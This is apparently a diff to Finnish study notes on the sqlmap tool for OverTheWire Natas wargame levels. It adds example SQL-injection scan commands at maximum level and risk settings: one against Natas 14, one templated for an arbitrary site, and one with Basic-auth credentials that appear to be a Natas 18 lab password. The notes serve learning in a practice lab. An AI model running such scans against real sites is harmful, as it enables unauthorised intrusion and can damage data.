@@ -181,7 +181,7 @@ Esim. tässä Natas 14 harjoituksessa: `http://natas14.natas.labs.overthewire.or
 
 ---
 
-# SQLMAP komento
+# SQLMAP komento - START HERE;
 
 tehokkuus ja laajuus säädetään sqlmapissa `--level` ja `--risk` -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.
 
@@ -192,7 +192,7 @@ Asetus	Merkitys
 --level=1-5	- Kuinka laajasti testataan parametreja (1 = nopea, 5 = kaikki mahdolliset)
 --risk=1-3	- Kuinka "riskialttiita" hyökkäyksiä käytetään (1 = turvallisia, 3 = voivat rikkoa)
 
-**ESIM**:
+### ESIM 1:
 SQLMAP komento POST-pyyntö esim:
 ```
 sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
@@ -200,6 +200,19 @@ sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
   --data="username=admin&password=admin" \
   --level=5 --risk=3 --batch
 ```
+
+### ESIM 2:
+Tämä voi olla perinteinen SQLmap komento, jos tekee ensimmäisen tarkastuksen ja tämä on malli: <br>
+`$sqlmap -u "http://kohde.fi/sivu.php?id=1" --batch --risk=3 --level=5`
+
+### ESIM 3:
+Kolmas esimerkki tämä on jos tiedetään käyttäjätunnus ja salasansa, että kuinka sijoitettaan se siihen väliin, ja tämä on kui nensimmäinen, mutta ilman seuraavaa `--data=username=admin&password` koska tämä on se formaatti joka lähettää sitä HTTP protokollaa sinne sivustojen lomake kenttään. Tämä alempi joka toimii kuin kirjauduttaan sisään tällä tunnuksella ja suoritettaan se skannaus prosessi: <br>
+
+```
+$sqlmap -u "http://natas18.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" --batch --risk=3 --level=5
+```
+
+---
 
 ## SQLmap tuloksia
 
